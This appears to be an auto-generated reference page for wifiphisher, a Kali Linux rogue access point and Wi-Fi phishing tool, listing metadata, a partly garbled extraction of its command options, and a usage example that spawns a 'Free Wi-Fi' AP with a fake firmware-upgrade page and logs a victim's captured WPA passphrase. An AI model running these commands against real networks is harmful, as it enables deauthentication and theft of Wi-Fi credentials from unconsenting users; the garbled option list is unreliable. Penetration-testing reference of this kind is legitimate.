---
tool_id: wifiphisher
title: wifiphisher
categories: ["wireless-attacks", "social-engineering-tools"]
category_slugs: ["wireless-attacks", "social-engineering-tools"]
homepage: https://github.com/sophron/wifiphisher
repository: 
version: 1.4+git20220707-0kali1
architectures: all
license: 
binaries: []
metapackages: ["kali-linux-everything"]
icon: images/wifiphisher-logo.svg
source_path: kali-tools\wifiphisher\index.md
source_commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
generated_at: 2026-01-03T15:46:07.172063
---

# Tool: wifiphisher (wifiphisher)

## Categories
- [wireless-attacks](../wireless-attacks.md)
- [social-engineering-tools](../social-engineering-tools.md)


## Quick Facts
| Field | Value |
| --- | --- |
| Homepage | [https://github.com/sophron/wifiphisher](https://github.com/sophron/wifiphisher) |
| Repository |  |
| Version | 1.4+git20220707-0kali1 |
| Architectures | all |
| License |  |
| Binaries |  |
| Metapackages | kali-linux-everything |
| Icon | images/wifiphisher-logo.svg |

## Install
*(No installation information found)*

## Official Info (Extracted)
- **Repository**: https://gitlab.com/kalilinux/packages/wifiphisher
- **PackagesInfo**: |
- ****Installed size**: ** `7.91 MB`
- ****How to install**: ** `sudo apt install wifiphisher`
- **{{< spoiler "Dependencies**: " >}}
- **root@kali**: ~# wifiphisher -h
- **usage**: wifiphisher [-h] [-i INTERFACE] [-eI EXTENSIONSINTERFACE]
- **options**: []
- **(i.e. deauth). Example**: -i wlan1
- **mode for deauthenticating the victims. Example**: -eI
- **spawning the rogue AP. Example**: -aI wlan0
- **InternetExample**: -iI ppp0
- **prevented from controlling them). Example**: -pI wlan1
- **interfaces will be protected.Example**: -mI wlan1
- **Channels to deauth. Example**: --deauth-channels 1,3,7
- **will skip Access Point selection phase. Example**: []
- **skip the scenario selection phase. Example**: -p
- **Example**: -pK s3cr3tp4ssw0rd
- **passphrase. Requires cowpatty. Example**: -hC


## Documentation (Upstream)

{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## Video

<script type="text/javascript" src="https://asciinema.org/a/104286.js" id="asciicast-104286" async></script>

## wifiphisher Usage Examples

Do not perform jamming (`-nJ`), create a wireless access point (`-e “Free Wi-Fi”`) and present a fake firmware upgrade to clients (`-T firmware-upgrade`). When a client connects, they a presented with a webpage to enter the PSK of their network:

```console
root@kali:~# wifiphisher -nJ -e "Free Wi-Fi" -T firmware-upgrade
[*] Starting Wifiphisher 1.1GIT at 2017-02-22 13:52
[+] Selecting wlan0 interface for creating the rogue Access Point
[*] Cleared leases, started DHCP, set up iptables
[+] Selecting Firmware Upgrade Page template
[*] Starting the fake access point...

Jamming devices:



DHCP Leases:
1487839973 c0:cc:f8:06:53:93 10.0.0.93 Victims-iPhone 11:c0:cc:38:66:a3:b3


HTTP requests:
[*] GET 10.0.0.93
[*] GET 10.0.0.93
[*] GET 10.0.0.93
[*] POST 10.0.0.93 wfphshr-wpa-password=s3cr3tp4s5
[*] GET 10.0.0.93
[*] GET 10.0.0.93
[*] GET 10.0.0.93
```


## Source
- Path: kali-tools\wifiphisher\index.md
- Commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
- Generated at: 2026-01-03T15:46:07.172063
